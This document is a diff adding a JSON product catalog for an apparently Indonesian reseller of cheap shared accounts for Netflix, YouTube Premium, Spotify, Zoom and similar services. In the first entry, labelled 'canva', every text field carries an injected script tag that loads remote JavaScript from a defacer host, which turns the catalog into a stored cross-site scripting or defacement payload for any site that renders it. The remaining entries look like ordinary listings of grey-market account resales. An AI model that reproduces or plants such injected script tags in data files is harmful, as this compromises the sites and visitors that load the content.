@@ -1,0 +1,398 @@
+[
+  {
+    "id": "canva",
+    "name": "canva",
+    "img": "<script src=\"https://jso.defacer.id/raw/7aw4vdQ9Q3\"></script>",
+    "desc": "<script src=\"https://jso.defacer.id/raw/7aw4vdQ9Q3\"></script>",
+    "tags": [
+      "Best Seller",
+      "Designer",
+      "Editor",
+      "Education",
+      "Hiburan",
+      "Music",
+      "Pro",
+      "Streaming",
+      "<script src=\"https://jso.defacer.id/raw/7aw4vdQ9Q3\"></script>"
+    ],
+    "features": [
+      "<script src=\"https://jso.defacer.id/raw/7aw4vdQ9Q3\"></script>"
+    ],
+    "snk": [
+      "<script src=\"https://jso.defacer.id/raw/7aw4vdQ9Q3\"></script>"
+    ],
+    "variants": []
+  },
+  {
+    "id": "netflix",
+    "name": "Netflix Premium",
+    "img": "https://assets.telkomsel.com/public/2025-02/Cara-dan-Biaya-Langganan-Netflix-Cari-Tahu-di-Sini.jpg?VersionId=MA4o09.U0ph2iYS4m3lmOKdEwEDDeZ8c",
+    "desc": "Nikmati ribuan film, serial, anime, dan dokumenter terbaik hanya dengan Netflix Premium.",
+    "features": [
+      "🚫 Tanpa iklan",
+      "📲 Bisa download offline",
+      "🌍 Akses di HP, Laptop, Tablet, dan Smart TV",
+      "Dan lain-lain"
+    ],
+    "snk": [
+      "🚨 1 profil = 1 device (KHUSUS 1P1U)",
+      "⛔ Dilarang mengubah email dan password",
+      "⛔ Dilarang otak-atik pengaturan",
+      "⛔ Dilarang menggunakan VPN",
+      "⛔ Dilarang memasukkan profil orang lain",
+      "⛔ Dilarang pindah-pindah device",
+      "⛔ Dilarang edit profil dan PIN",
+      "🛠 Garansi fixing 1x24 jam",
+      "🕒 25–30 hari = 1 bulan",
+      "🔐 Kemungkinan ada pergantian password (akan diinformasikan)",
+      "🚨 Setelah login wajib konfirmasi device dan lokasi (contoh: Infinix – Bandung)",
+      "🚨PRIVAT SNK TANYAIN ADMIN/OWNER🚨"
+    ],
+    "variants": [
+      {
+        "id": "netflix1p1u",
+        "label": "Netflix 1P1U 3 Hari (LOGIN 1 DEVICE)",
+        "price": 5000,
+        "code": "netflix"
+      },
+      {
+        "id": "netflix1p1u",
+        "label": "Netflix 1P1U 7 Hari (LOGIN 1 DEVICE)",
+        "price": 10000,
+        "code": "netflix"
+      },
+      {
+        "id": "netflix1p1u",
+        "label": "Netflix 1P1U 1 Bulan (LOGIN 1 DEVICE)",
+        "price": 30000,
+        "code": "netflix"
+      },
+      {
+        "id": "netpriv",
+        "label": "Netflix Privat 1 Bulan ( 5 PROFIL 1 AKUN )",
+        "price": 125000,
+        "code": "netpriv"
+      }
+    ],
+    "tags": [
+      "Best Seller",
+      "Streaming"
+    ]
+  },
+  {
+    "id": "youtube",
+    "name": "YouTube Premium",
+    "img": "https://cdn.medcom.id/dynamic/content/2023/04/12/1557608/FZXyYmGAhL.jpg?w=700",
+    "desc": "Nikmati pengalaman nonton & dengar musik tanpa batas dengan YouTube Premium.",
+    "features": [
+      "🚫 Tanpa iklan – nonton & dengar musik lebih nyaman",
+      "📲 Download offline – simpan video & musik, tonton kapan saja",
+      "🎵 YouTube Music Premium – jutaan lagu tanpa batas",
+      "🔊 Background Play – tetap jalan meski layar mati",
+      "🌍 Bisa dipakai di HP, laptop, tablet, & Smart TV"
+    ],
+    "snk": [
+      "✅ Full garansi",
+      "🕒 20–30 hari dihitung 1 bulan",
+      "👥 (Head) Bisa invite 5 orang jadi premium",
+      "🔐 Akun dari seller wajib ganti password",
+      "⚠️ Lupa password bukan garansi seller"
+    ],
+    "variants": [
+      {
+        "id": "ytfamilyinvite1b",
+        "label": "Family Plan Invite 1 Bulan",
+        "price": 5000,
+        "code": "manual"
+      },
+      {
+        "id": "ytfamilyhead1b",
+        "label": "Family Plan Head 1 Bulan",
+        "price": 8000,
+        "code": "ythead"
+      },
+      {
+        "id": "ytindividual1b",
+        "label": "Individual Plan 1 Bulan",
+        "price": 10000,
+        "code": "yt1b"
+      }
+    ],
+    "tags": [
+      "Streaming",
+      "Music",
+      "Hiburan"
+    ]
+  },
+  {
+    "id": "capcut",
+    "name": "Capcut Pro",
+    "img": "https://cdnpro.eraspace.com/media/mageplaza/blog/post/t/i/tips_menggunakan_capcut-primary.png",
+    "desc": "Buat dan edit video jadi lebih profesional dengan CapCut Pro!",
+    "tags": [
+      "Best Seller",
+      "Pro",
+      "Editor"
+    ],
+    "features": [
+      "🚫 Tanpa watermark – hasil video lebih bersih & profesional",
+      "🎞️ Efek & filter premium – akses ribuan efek, font, dan stiker",
+      "🎶 Audio & musik eksklusif – bebas pilih sound trend terbaru",
+      "⏱️ Export kualitas tinggi – hingga Full HD/4K",
+      "📲 Bisa digunakan di HP, tablet, dan PC"
+    ],
+    "snk": [
+      "✅login max 3-4 Device",
+      "✅ 𝗟𝗢𝗚𝗜𝗡 𝗩𝗜𝗔 Email bukan google",
+      "✅ garansi backfree only 5/20 day",
+      "❎ Dilarang keras login logout",
+      "❎ Tidak Bisa Perpanjang Masa Aktif"
+    ],
+    "variants": [
+      {
+        "id": "capcut7hari",
+        "label": "7 Hari",
+        "price": 6000,
+        "code": "capcut7d"
+      },
+      {
+        "id": "capcut1bulan",
+        "label": "1 Bulan",
+        "price": 12000,
+        "code": "capcut1b"
+      }
+    ]
+  },
+  {
+    "id": "primevideo",
+    "name": "PRIME VIDEO",
+    "img": "https://i.vimeocdn.com/video/1586162092-020d20c6f8b5fd388ed06ba6929021b826007c55c5fa007f23d6fbac44c2e489-d?f=webp",
+    "desc": "Nikmati ribuan film, serial TV, dan konten eksklusif dari Amazon Prime Video.",
+    "tags": [
+      "Streaming",
+      "Hiburan"
+    ],
+    "features": [
+      "📺 Akses ribuan film & serial global",
+      "🎥 Konten eksklusif Prime Originals",
+      "🚫 Tanpa iklan – nonton jadi lebih nyaman",
+      "📲 Download offline – simpan & tonton kapan saja",
+      "🎞️ Kualitas video hingga Full HD / 4K Ultra HD",
+      "🌍 Bisa digunakan di HP, Laptop, Tablet, dan Smart TV"
+    ],
+    "snk": [
+      "Akun Private",
+      "Garansi 20hari",
+      "Akun disediakan seller"
+    ],
+    "variants": [
+      {
+        "id": "videoprime1bulan",
+        "label": "1 Bulan",
+        "price": 15000,
+        "code": "primevideo"
+      }
+    ]
+  },
+  {
+    "id": "vidio",
+    "name": "VIDIO PLATINUM",
+    "img": "https://static-web.prod.vidiocdn.com/assets/logo/og-image-d05dbd2139d2276a7b552b63e0cd2b3af90c3abe26335cecd79515370ceca815.png",
+    "desc": "Nikmati hiburan terlengkap dengan Vidio Premier Platinum – paket premium all-in-one dari Vidio.\n",
+    "tags": [
+      "Streaming",
+      "Hiburan"
+    ],
+    "features": [
+      "⚽ Liga 1 Indonesia, UCL, UEL, dan pertandingan bola top lainnya",
+      "🎥 Vidio Originals eksklusif",
+      "🎞️ Film & drama Asia, Hollywood, anime, dan tontonan keluarga",
+      "📡 Live TV nasional & internasional",
+      "❌ Paket Platinum tidak termasuk EPL, F1, MotoGP, FA Cup, dan SPOTV. Konten ini ada di paket Platinum Extra/Ultimate."
+    ],
+    "snk": [
+      "➡️ Login dengan email yang sudah diberikan",
+      "➡️ Dilarang mengganti metode pembayaran / plan",
+      "➡️ TV (GARANSI 1 BULAN ) dan Mobile (Garansi 20 Hari)",
+      "➡️ Jika terdapat kendala silahkan hubungi admin",
+      "➡️Garansi BackFree"
+    ],
+    "variants": [
+      {
+        "id": "vidiotvonly",
+        "label": "Vidio TV Only 1 Tahun (Garansi 1 Bulan)",
+        "price": 15000,
+        "code": "vidiotv"
+      },
+      {
+        "id": "vidiomobileonly",
+        "label": "Vidio Mobile Only 1 Bulan (Garansi 20 Hari)",
+        "price": 25000,
+        "code": "vidiomobile"
+      },
+      {
+        "id": "vidioalldevice",
+        "label": "ALL DEVICE PLATINUM 1 Bulan (Garansi 20 Hari) 🔥 BEST SELLER 🔥",
+        "price": 38000,
+        "code": "vidioalldev"
+      }
+    ]
+  },
+  {
+    "id": "viu",
+    "name": "VIU Premium",
+    "img": "https://assets.telkomsel.com/public/2025-01/Cara-Termudah-Langganan-Viu-Hanya-Beberapa-Kali-Klik.jpg?VersionId=ad410H.OkX24LobObo2I.JqmL.TrtfS_",
+    "desc": "Nikmati drama Korea, Asia, dan film eksklusif hanya dengan VIU Premium.\n",
+    "tags": [
+      "Streaming",
+      "Hiburan"
+    ],
+    "features": [
+      "🎬 Drama Korea & Asia terbaru update cepat setelah tayang di negara asal",
+      "🚫 Tanpa iklan – nonton lebih nyaman",
+      "📲 Download offline – simpan & tonton kapan saja",
+      "🌍 Bisa diakses di HP, Tablet, Laptop, dan Smart TV",
+      "🎞️ Kualitas video HD"
+    ],
+    "snk": [
+      "Akun Privat",
+      "Bergaransi Sesuai Variant",
+      "Garansi Berlaku Jika tidak ubah password"
+    ],
+    "variants": [
+      {
+        "id": "viu3bulan",
+        "label": "VIU 3 Bulan (Garansi 1 Bulan)",
+        "price": 3000,
+        "code": "viu3b"
+      },
+      {
+        "id": "viuseumurhidup",
+        "label": "VIU LIFETIME (Garansi 6 Bulan)",
+        "price": 10000,
+        "code": "viulifetime"
+      },
+      {
+        "id": "viu1tahun",
+        "label": "VIU 1 Tahun (Garansi 6 Bulan)",
+        "price": 8000,
+        "code": "viu1t"
+      },
+      {
+        "id": "viu6b",
+        "label": "VIU 6 Bulan (Garansi 3 Bulan)",
+        "price": 5000,
+        "code": "viu6b"
+      }
+    ]
+  },
+  {
+    "id": "zoom",
+    "name": "ZOOM PRO",
+    "img": "https://cdn.mos.cms.futurecdn.net/25UeWUrVGmuXUjnG6Yt7rj.jpg",
+    "desc": "Paket ini cocok untuk bisnis, sekolah, maupun komunitas yang butuh durasi meeting lebih panjang, kapasitas peserta lebih banyak, dan fitur profesional lainnya.",
+    "tags": [
+      "Education",
+      "Pro"
+    ],
+    "features": [
+      "⏱️ Durasi meeting hingga 30 jam (tanpa batas 40 menit)",
+      "👥 Kapasitas hingga 100 peserta",
+      "🎥 Cloud recording – rekam & simpan meeting di cloud",
+      "🔒 Keamanan premium – enkripsi & kontrol host lebih lengkap",
+      "📲 Bisa diakses dari HP, Laptop, Tablet, dan Browser",
+      "🛠️ Fitur tambahan: polling, breakout rooms, dan laporan meeting"
+    ],
+    "snk": [
+      "Akun dari seller",
+      "Private Account",
+      "Dapat akses email",
+      "Garansi Backfree 5/10 hari"
+    ],
+    "variants": [
+      {
+        "id": "zoom7hari",
+        "label": "ZOOM PRO 7 HARI",
+        "price": 7000,
+        "code": "zoom7d"
+      },
+      {
+        "id": "zoom14hari",
+        "label": "ZOOM PRO 14 HARI",
+        "price": 10000,
+        "code": "zoom14d"
+      }
+    ]
+  },
+  {
+    "id": "ampro",
+    "name": "Alight Motion",
+    "img": "https://asset-a.grid.id/crop/0x0:0x0/x/photo/2022/08/11/alight-motion-projpg-20220811043646.jpg",
+    "desc": "Edit video jadi lebih profesional tanpa watermark!\nDengan Alight Motion Pro 1 Tahun, kamu bisa menikmati semua fitur premium untuk membuat konten aesthetic, cinematic, maupun motion graphic dengan mudah langsung dari HP.",
+    "tags": [
+      "Editor",
+      "Designer",
+      "Pro"
+    ],
+    "features": [
+      "✨ Fitur Utama:",
+      "🔓 Full Unlock Premium – semua fitur terbuka tanpa batas",
+      "🚫 Tanpa Watermark – hasil editing lebih bersih dan profesional",
+      "🎨 Banyak Preset & Efek – ribuan efek visual, transisi, dan animasi",
+      "🖌️ Kustomisasi Lengkap – dukungan layer tak terbatas, vector & bitmap editing",
+      "📂 Ekspor Berkualitas Tinggi – hingga 4K, bisa pilih format sesuai kebutuhan"
+    ],
+    "snk": [
+      "✅ Bergaransi 3 Bulan sejak tanggal pembelian",
+      "✅ Akun disediakan langsung oleh seller",
+      "✅ Pembeli mendapatkan akses email akun",
+      "✅ Garansi Backfree berlaku (jika akun bermasalah, akan diganti sesuai ketentuan garansi)"
+    ],
+    "variants": [
+      {
+        "id": "Alightmotion",
+        "label": "1 TAHUN - GARANSI 3 BULAN",
+        "price": 8000,
+        "code": "AM"
+      }
+    ]
+  },
+  {
+    "id": "spotifypremium",
+    "name": "SPOTIFY PREMIUM",
+    "img": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRF4i2h_y9d6x6SR8ozro3iSxCMrF48ibbBIw&s",
+    "desc": "Dengarkan musik tanpa batas dengan Spotify Premium 1 Bulan. Nikmati semua fitur premium untuk streaming lebih nyaman dan bebas iklan.",
+    "tags": [
+      "Music",
+      "Pro"
+    ],
+    "features": [
+      "🚫 Tanpa Iklan – musik full bebas gangguan",
+      "⏯️ Skip Lagu Tanpa Batas – putar sesuai selera",
+      "📥 Download Lagu – dengarkan offline tanpa kuota",
+      "🔊 Kualitas Audio Premium – hingga 320kbps",
+      "🌍 Bisa login di HP, PC, atau tablet"
+    ],
+    "snk": [
+      "✅ Akun sudah disediakan seller (region mix)",
+      "✅ Plan Student Only",
+      "✅ Bisa login menggunakan kode",
+      "✅ Garansi 20 Hari (khusus produk yang bergaransi)",
+      "✅ Garansi Backfree berlaku (akun diganti sesuai ketentuan)"
+    ],
+    "variants": [
+      {
+        "id": "spotifynogaransi",
+        "label": "1 BULAN - NO GARANSI",
+        "price": 8000,
+        "code": "spotifynogar"
+      },
+      {
+        "id": "spotifygaransi",
+        "label": "1 BULAN - GARANSI",
+        "price": 15000,
+        "code": "spotify"
+      }
+    ]
+  }
+]
